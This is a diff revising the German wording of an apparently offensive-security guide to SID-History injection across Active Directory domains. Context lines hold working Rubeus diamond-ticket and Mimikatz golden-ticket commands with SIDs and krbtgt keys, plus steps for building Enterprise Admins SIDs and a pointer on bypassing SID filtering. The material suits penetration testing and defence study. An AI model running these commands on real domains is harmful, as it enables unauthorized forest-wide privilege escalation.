@@ -4,15 +4,15 @@
 
 ## SID-History Injection Angriff
 
-Der Fokus des **SID-History Injection Angriffs** liegt darauf, **Benutzermigrationen zwischen Domänen** zu unterstützen und gleichzeitig den Zugriff auf Ressourcen der ehemaligen Domäne zu gewährleisten. Dies wird erreicht, indem **der vorherige Sicherheitsbezeichner (SID) des Benutzers in die SID-History** seines neuen Kontos integriert wird. Bemerkenswerterweise kann dieser Prozess manipuliert werden, um unbefugten Zugriff zu gewähren, indem der SID einer hochprivilegierten Gruppe (wie Enterprise Admins oder Domain Admins) aus der übergeordneten Domäne zur SID-History hinzugefügt wird. Diese Ausnutzung gewährt Zugriff auf alle Ressourcen innerhalb der übergeordneten Domäne.
+Der Fokus des **SID-History Injection Angriffs** liegt darauf, **Benutzermigrationen zwischen Domänen** zu unterstützen und gleichzeitig den Zugriff auf Ressourcen der ehemaligen Domäne sicherzustellen. Dies wird erreicht, indem **der vorherige Sicherheitsbezeichner (SID) des Benutzers in die SID-History** seines neuen Kontos integriert wird. Bemerkenswerterweise kann dieser Prozess manipuliert werden, um unbefugten Zugriff zu gewähren, indem die SID einer hochprivilegierten Gruppe (wie Enterprise Admins oder Domain Admins) aus der übergeordneten Domäne zur SID-History hinzugefügt wird. Diese Ausnutzung gewährt Zugriff auf alle Ressourcen innerhalb der übergeordneten Domäne.
 
 Es gibt zwei Methoden zur Durchführung dieses Angriffs: durch die Erstellung eines **Golden Ticket** oder eines **Diamond Ticket**.
 
-Um den SID für die Gruppe **"Enterprise Admins"** zu ermitteln, muss zunächst der SID der Root-Domäne gefunden werden. Nach der Identifizierung kann der SID der Enterprise Admins-Gruppe konstruiert werden, indem `-519` an den SID der Root-Domäne angehängt wird. Wenn der SID der Root-Domäne beispielsweise `S-1-5-21-280534878-1496970234-700767426` ist, wäre der resultierende SID für die Gruppe "Enterprise Admins" `S-1-5-21-280534878-1496970234-700767426-519`.
+Um die SID der **"Enterprise Admins"** Gruppe zu bestimmen, muss zunächst die SID der Root-Domäne gefunden werden. Nach der Identifizierung kann die SID der Enterprise Admins Gruppe konstruiert werden, indem `-519` an die SID der Root-Domäne angehängt wird. Wenn die SID der Root-Domäne beispielsweise `S-1-5-21-280534878-1496970234-700767426` ist, wäre die resultierende SID für die "Enterprise Admins" Gruppe `S-1-5-21-280534878-1496970234-700767426-519`.
 
-Sie könnten auch die **Domain Admins**-Gruppen verwenden, die mit **512** enden.
+Sie könnten auch die **Domain Admins** Gruppen verwenden, die mit **512** enden.
 
-Eine andere Möglichkeit, den SID einer Gruppe der anderen Domäne (zum Beispiel "Domain Admins") zu finden, ist:
+Eine andere Möglichkeit, die SID einer Gruppe der anderen Domäne (zum Beispiel "Domain Admins") zu finden, ist:
 ```bash
 Get-DomainGroup -Identity "Domain Admins" -Domain parent.io -Properties ObjectSid
 ```
@@ -24,11 +24,11 @@ Laut den [**Docs**](https://technet.microsoft.com/library/cc835085.aspx):
 - **Anwendung der SID-Filterquarantäne auf externe Verträge** mit dem netdom-Tool (`netdom trust /domain: /quarantine:yes on the domain controller`)
 - **Anwendung der SID-Filterung auf Domänenverträge innerhalb eines einzelnen Forests** wird nicht empfohlen, da es sich um eine nicht unterstützte Konfiguration handelt und zu brechenden Änderungen führen kann. Wenn eine Domäne innerhalb eines Forests nicht vertrauenswürdig ist, sollte sie kein Mitglied des Forests sein. In dieser Situation ist es notwendig, zuerst die vertrauenswürdigen und nicht vertrauenswürdigen Domänen in separate Forests zu trennen, auf die die SID-Filterung auf ein Interforest-Vertrauen angewendet werden kann.
 
-Überprüfen Sie diesen Beitrag für weitere Informationen zum Umgehen dieser: [**https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4**](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
+Überprüfen Sie diesen Beitrag für weitere Informationen zum Umgehen davon: [**https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4**](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
 
 ### Diamond Ticket (Rubeus + KRBTGT-AES256)
 
-Beim letzten Mal, als ich dies ausprobierte, musste ich das Argument **`/ldap`** hinzufügen.
+Beim letzten Mal, als ich das ausprobiert habe, musste ich das Argument **`/ldap`** hinzufügen.
 ```bash
 # Use the /sids param
 Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:512 /sids:S-1-5-21-378720957-2217973887-3501892633-512 /krbkey:390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa /nowrap /ldap
@@ -80,7 +80,7 @@ diamond-ticket.md
 .\kirbikator.exe lsa .\CIFS.mcorpdc.moneycorp.local.kirbi
 ls \\mcorp-dc.moneycorp.local\c$
 ```
-Erhöhen Sie sich zu DA von Root oder Enterprise-Administrator unter Verwendung des KRBTGT-Hashes der kompromittierten Domäne:
+Erhöhen Sie sich zu DA von Root oder Enterprise-Admin unter Verwendung des KRBTGT-Hashes der kompromittierten Domäne:
 ```bash
 Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-211874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234700767426-519 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ticket:C:\AD\Tools\krbtgt_tkt.kirbi"'
 
